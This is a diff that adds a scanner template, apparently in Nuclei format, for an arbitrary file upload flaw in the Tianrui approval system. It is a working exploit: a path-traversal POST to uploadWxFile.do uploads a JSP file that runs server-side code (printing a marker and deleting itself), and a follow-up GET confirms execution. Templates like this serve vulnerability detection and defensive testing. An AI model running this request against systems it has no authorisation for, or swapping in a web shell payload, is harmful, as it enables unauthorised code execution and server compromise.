@@ -1,0 +1,55 @@
+id: poc-yaml-tipray-gsas-uploadwxfile-do-anyfile-upload
+info:
+  name: Arbitrary File Upload Vulnerability in Tianrui Approval System
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template identifies an arbitrary file upload vulnerability in the Tianrui Approval System. It allows uploading JSP files, which can then be accessed to execute arbitrary code.
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/trwfe/service/.%2E/config/uploadWxFile.do"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+    body: |
+      ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "true"
+        part: body
+    extractors:
+      - type: dsl
+        dsl:
+          - "'{{t1}}.jsp'"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
